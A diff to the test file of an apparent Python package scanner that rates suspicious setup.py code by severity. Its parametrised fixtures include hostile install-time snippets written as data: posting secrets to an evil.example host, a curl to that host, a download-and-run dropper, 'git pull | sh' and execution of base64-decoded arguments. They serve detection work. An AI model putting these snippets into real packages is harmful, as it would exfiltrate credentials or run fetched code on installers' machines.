@@ -12,15 +12,14 @@ from crotalus.models import (
     Release,
     ReleaseMetadata,
 )
-from crotalus.rules import (
-    hidden_code_exec,
+from crotalus.rules.helpers.import_graph import import_time_calls, modules_run_on_import
+from crotalus.rules.helpers.static_code_analysis import calls, read
+from crotalus.rules.hidden_code import hidden_code_exec, pth_import_running_code
+from crotalus.rules.process_and_network import (
     import_time_code,
-    pth_import_running_code,
     setup_py_install_time,
     unimported_script_code,
 )
-from crotalus.rules.helpers.import_time import import_time_calls, modules_run_on_import
-from crotalus.rules.helpers.static_code_analysis import calls, read
 
 
 def call_names(source: str) -> list[str | None]:
@@ -254,6 +253,7 @@ def test_pth_in_sdist_is_ignored() -> None:
         ("import subprocess as sp\nsp.Popen(['sh', '-c', 'x'])", "medium"),
         ("import requests\nrequests.post('https://evil.example', data=secrets)", "medium"),
         ("import socket\ns = socket.socket()", "medium"),
+        ("import subprocess\nsubprocess.run(['git', 'describe'])", "medium"),  # build tools too
         (  # download, then run: a dropper
             "import urllib.request, os\n"
             "urllib.request.urlretrieve(u, '/tmp/x')\n"
@@ -266,42 +266,15 @@ def test_pth_in_sdist_is_ignored() -> None:
             "os.system(payload)",
             "critical",
         ),
+        (  # run what was decoded
+            "import subprocess, base64\nsubprocess.run(['git', base64.b64decode(x)])",
+            "critical",
+        ),
     ],
 )
 def test_setup_py_install_time(setup_py: str, severity: str) -> None:
     findings = setup_py_install_time.check(context(sdist={"setup.py": setup_py}))
     assert rule_ids(findings) == ["setup_py_install_time"]
-    assert findings[0].severity == severity
-
-
-@pytest.mark.parametrize(
-    ("setup_py", "severity"),
-    [  # build tools, written out in full: low
-        ("import subprocess\nsubprocess.run(['git', 'rev-parse', 'HEAD'])", "low"),
-        ("import subprocess\nsubprocess.run('sycl-ls', shell=True)", "low"),
-        ("import os\nos.system('python setup.py sdist upload')", "low"),
-        ("import subprocess, sys\nsubprocess.run([sys.executable, str(script)])", "low"),
-        ("import subprocess\nsubprocess.run(['/usr/bin/nvidia-smi'])", "low"),
-        # not build tools, or can't tell: medium
-        ("import subprocess\nsubprocess.run(cmd)", "medium"),
-        ("import os\nos.system('git pull | sh')", "medium"),
-        ("import subprocess\nsubprocess.run(['curl', 'https://evil.example'])", "medium"),
-        ("import subprocess, sys\nsubprocess.run([sys.executable, '-c', code])", "medium"),
-        ("import subprocess, sys\nsubprocess.run([sys.executable, '-m', 'pip'])", "medium"),
-        (  # a build tool, but run with decoded data
-            "import subprocess, base64\nsubprocess.run(['git', base64.b64decode(x)])",
-            "critical",
-        ),
-        (  # build tools don't make a download high
-            "import subprocess, urllib.request\n"
-            "urllib.request.urlretrieve(u, 'x.tar.gz')\n"
-            "subprocess.run(['make'])",
-            "medium",
-        ),
-    ],
-)
-def test_setup_py_build_tools(setup_py: str, severity: str) -> None:
-    findings = setup_py_install_time.check(context(sdist={"setup.py": setup_py}))
     assert findings[0].severity == severity
 
 
@@ -322,6 +295,7 @@ def test_setup_py_evidence_lists_calls_in_order() -> None:
     [
         {"setup.py": "from setuptools import setup\nsetup(name='pkg')"},  # the normal case
         {"setup.py": "import requests\nsetup(install_requires=['requests'])"},  # import only
+        {"setup.py": "import httpx\nTIMEOUT = httpx.Timeout(60)"},  # sends nothing
         {"setup.py": "print 'python 2'"},  # can't run on Python 3
         {"pkg/setup.py": "import os\nos.system('x')"},  # not the setup.py pip runs
     ],
